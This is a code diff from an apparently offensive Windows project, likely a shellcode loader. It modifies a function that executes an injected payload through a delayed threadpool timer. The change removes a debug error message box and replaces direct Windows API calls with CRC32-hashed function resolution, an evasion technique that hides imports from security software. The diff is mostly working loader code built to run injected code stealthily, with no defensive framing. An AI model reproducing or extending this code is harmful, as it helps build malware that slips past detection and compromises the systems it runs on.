@@ -56,35 +56,36 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
     return TRUE;
 }
 
-VOID CALLBACK TimerCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer)
-{
-    // Payload execution code here
-    ((void(*)(void))Context)();
-}
-
 VOID Execute(PVOID pInjectedPayload)
 {
-    TP_CALLBACK_ENVIRON     tpCallbackEnv   = { 0 };
-    FILETIME                FileDueTime     = { 0 };
-    ULARGE_INTEGER          ulDueTime       = { 0 };
-    PTP_TIMER               ptpTimer        = NULL;
+    TP_CALLBACK_ENVIRON		tpCallbackEnv	= { 0 };
+    FILETIME				FileDueTime		= { 0 };
+    ULARGE_INTEGER			ulDueTime		= { 0 };
+    PTP_TIMER				ptpTimer		= NULL;
 
     if (!pInjectedPayload)
+        return;
+
+    fnCreateThreadpoolTimer				pCreateThreadpoolTimer				= (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), CreateThreadpoolTimer_CRC32);
+    fnSetThreadpoolTimer				pSetThreadpoolTimer					= (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), SetThreadpoolTimer_CRC32);
+    fnWaitForSingleObject				pWaitForSingleObject				= (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), WaitForSingleObject_CRC32);
+
+    if (!pCreateThreadpoolTimer || !pSetThreadpoolTimer || !pWaitForSingleObject)
     {
-        MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
+        return;
+    }
+    InitializeThreadpoolEnvironment(&tpCallbackEnv);
+
+    if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv)))
+    {
         return;
     }
 
-    InitializeThreadpoolEnvironment(&tpCallbackEnv);
+    ulDueTime.QuadPart			= (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
+    FileDueTime.dwHighDateTime	= ulDueTime.HighPart;
+    FileDueTime.dwLowDateTime	= ulDueTime.LowPart;
 
-    if (!(ptpTimer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv)))
-        return;
+    pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
 
-    ulDueTime.QuadPart              = (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
-    FileDueTime.dwHighDateTime      = ulDueTime.HighPart;
-    FileDueTime.dwLowDateTime       = ulDueTime.LowPart;
-
-    SetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
-
-    WaitForSingleObject((HANDLE)-1, INFINITE);
+    pWaitForSingleObject((HANDLE)-1, INFINITE);
 }
